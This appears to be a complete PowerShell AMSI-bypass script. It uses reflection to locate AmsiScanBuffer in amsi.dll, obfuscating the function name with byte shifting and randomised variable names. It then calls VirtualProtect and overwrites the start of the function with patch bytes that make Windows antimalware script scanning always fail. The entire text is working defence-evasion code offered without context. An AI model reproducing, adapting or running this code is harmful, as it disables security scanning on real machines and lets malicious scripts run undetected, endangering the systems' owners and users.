function candidate {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
 Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods');
 $tmp=@();
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 try{
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName));
 }
 catch{
        $tmpPtr = New-Object IntPtr
 	$modHandle = $assem.GetMethod('GetModuleHandle').Invoke($null,@($moduleName))
 	$HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $modHandle)
 	return $tmp[0].Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $functionName))
 }
}

function fleck {
 Param (
 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $MiFTRNds99 = [Void]
 )
 $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
 [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]);
 $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed');
 $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $MiFTRNds99, $func).SetImplementationFlags('Runtime, Managed');
 return $type.CreateType();
}

$asdqwe = @(75,119,125,115,93,109,107,120,76,127,112,112,111,124)
for($i=0;$i -lt $asdqwe.Length;$i++){
	$asdqwe[$i]=$asdqwe[$i]-10
}
[IntPtr]$LGaudzvo99 = candidate amsi.dll $([System.Text.Encoding]::ASCII.getString($asdqwe));
$HjmYfFIP99 = 0;
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((candidate kernel32.dll VirtualProtect),(fleck @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])));
$vp.Invoke($LGaudzvo99, 3, 0x40, [ref]$HjmYfFIP99);
$buf = [Byte[]] (0xc2, 0x61, 0xa, 0x11, 0x8a, 0xcd);

for($i=0;$i -lt $buf.Length;$i++){
  $buf[$i] = $buf[$i]-10
}
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $LGaudzvo99, 6);
$vp.Invoke($LGaudzvo99, 3, 0x20, [ref]$HjmYfFIP99);

$arr = New-Object Byte[] 10;
[System.Runtime.InteropServices.Marshal]::Copy($LGaudzvo99, $arr, 0, 6);
$arr -join ",";